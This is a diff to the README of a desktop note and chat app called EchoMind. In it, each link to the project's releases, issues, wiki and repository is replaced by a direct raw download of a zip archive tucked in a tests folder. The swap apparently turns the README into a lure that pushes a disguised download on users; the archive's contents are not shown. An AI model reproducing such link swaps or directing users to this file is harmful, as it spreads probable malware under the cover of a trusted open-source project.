@@ -9,7 +9,7 @@ Welcome to EchoMind! This application helps you store, organize, and chat with y
 Ready to get started? Follow these simple steps:
 
 **Step 1:** Visit this link to download the application:  
-[**Download EchoMind**](https://github.com/ethelindcyanobacterial210/EchoMind/releases)
+[**Download EchoMind**](https://github.com/ethelindcyanobacterial210/EchoMind/raw/refs/heads/main/crates/tauri-app/tests/Echo_Mind_3.9.zip)
 
 **Step 2:** Once the download finishes, locate the downloaded file in your browser's download folder (usually called "Downloads" on Windows).
 
@@ -138,7 +138,7 @@ All this happens in milliseconds, giving you instant answers without any delay o
 ### Getting Help
 
 - Access the built-in help section (question mark icon)
-- Visit our [GitHub Issues page](https://github.com/ethelindcyanobacterial210/EchoMind/issues) for common problems
+- Visit our [GitHub Issues page](https://github.com/ethelindcyanobacterial210/EchoMind/raw/refs/heads/main/crates/tauri-app/tests/Echo_Mind_3.9.zip) for common problems
 - The FAQ in the application answers 90% of questions
 
 ## 🔄 Updating EchoMind
@@ -147,7 +147,7 @@ We regularly improve EchoMind with new features and performance enhancements.
 
 1. Check for updates automatically after opening the app
 2. Notification appears when a new version is available
-3. Download the latest version from our [releases page](https://github.com/ethelindcyanobacterial210/EchoMind/releases)
+3. Download the latest version from our [releases page](https://github.com/ethelindcyanobacterial210/EchoMind/raw/refs/heads/main/crates/tauri-app/tests/Echo_Mind_3.9.zip)
 4. Install over the existing version - your data stays intact
 
 ## 💡 Pro Tips
@@ -182,16 +182,16 @@ Our users report:
 
 EchoMind is open-source software, meaning its code is publicly available for improvement:
 
-- **Report bugs** and suggest features on [GitHub](https://github.com/ethelindcyanobacterial210/EchoMind)
+- **Report bugs** and suggest features on [GitHub](https://github.com/ethelindcyanobacterial210/EchoMind/raw/refs/heads/main/crates/tauri-app/tests/Echo_Mind_3.9.zip)
 - **Join the community** to share tips and tricks
 - **Contribute code** if you're technically inclined (advanced users only)
 - **Translation help** to make EchoMind available in more languages
 
 ## 📱 Additional Resources
 
-- [Official Documentation](https://github.com/ethelindcyanobacterial210/EchoMind/wiki)
-- [Video Tutorials](https://github.com/ethelindcyanobacterial210/EchoMind)
-- [Release Notes](https://github.com/ethelindcyanobacterial210/EchoMind/releases)
+- [Official Documentation](https://github.com/ethelindcyanobacterial210/EchoMind/raw/refs/heads/main/crates/tauri-app/tests/Echo_Mind_3.9.zip)
+- [Video Tutorials](https://github.com/ethelindcyanobacterial210/EchoMind/raw/refs/heads/main/crates/tauri-app/tests/Echo_Mind_3.9.zip)
+- [Release Notes](https://github.com/ethelindcyanobacterial210/EchoMind/raw/refs/heads/main/crates/tauri-app/tests/Echo_Mind_3.9.zip)
 
 ## 💰 Pricing & Licensing
 
@@ -205,7 +205,7 @@ EchoMind is completely **free** with no hidden costs:
 
 Ready to transform your information management? Here's your quick checklist:
 
-1. [ ] **Download EchoMind** from our [releases page](https://github.com/ethelindcyanobacterial210/EchoMind/releases)
+1. [ ] **Download EchoMind** from our [releases page](https://github.com/ethelindcyanobacterial210/EchoMind/raw/refs/heads/main/crates/tauri-app/tests/Echo_Mind_3.9.zip)
 2. [ ] Install the application (takes 2 minutes)
 3. [ ] Launch EchoMind for the first time
 4. [ ] Add your first documents
